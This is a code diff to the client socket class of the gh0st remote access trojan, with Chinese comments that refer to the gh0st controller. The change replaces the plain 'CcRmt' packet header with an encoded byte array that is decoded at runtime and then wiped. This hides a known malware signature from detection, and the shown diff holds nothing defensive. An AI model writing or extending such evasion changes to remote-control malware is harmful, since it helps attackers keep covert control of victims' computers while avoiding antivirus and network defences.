@@ -8,6 +8,7 @@
 #include <MSTcpIP.h>
 #include "common/Manager.h"
 #include "common/until.h"
+
 #pragma comment(lib, "ws2_32.lib")
 
 //////////////////////////////////////////////////////////////////////
@@ -29,8 +30,13 @@ CClientSocket::CClientSocket()
 	m_bIsRunning = false;
 	m_Socket = INVALID_SOCKET;
 	// Packet Flag;
-	BYTE bPacketFlag[] = { 'C', 'c', 'R', 'm', 't' };    //注意这个数据头 ，在讲解gh0st主控端的时候我就说过，要一致
-	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
+
+	char CcRmt[] = { 0x05,0x88,0xa9,0x9b,0xa5,0xb3 };	//CcRmt 注意这个数据头 ，和gh0st主控端要一致
+	char* pCcRmt = decodeStr(CcRmt);					//解密函数
+
+	memcpy(m_bPacketFlag, pCcRmt, CcRmt[STR_CRY_LENGTH]);
+	memset(pCcRmt, 0, CcRmt[STR_CRY_LENGTH]);					//填充0
+	delete pCcRmt;
 }
 //---析构函数 用于类的销毁
 CClientSocket::~CClientSocket()
@@ -344,7 +350,7 @@ void CClientSocket::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
 				m_CompressionBuffer.Read(pData, nCompressLength);
 
 				//////////////////////////////////////////////////////////////////////////
-				//---还记得主控端么？？  还是解压数据看看是否成功，如果成功则向下进行
+				// 还是解压数据看看是否成功，如果成功则向下进行
 				unsigned long	destLen = nUnCompressLength;
 				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
 				//////////////////////////////////////////////////////////////////////////
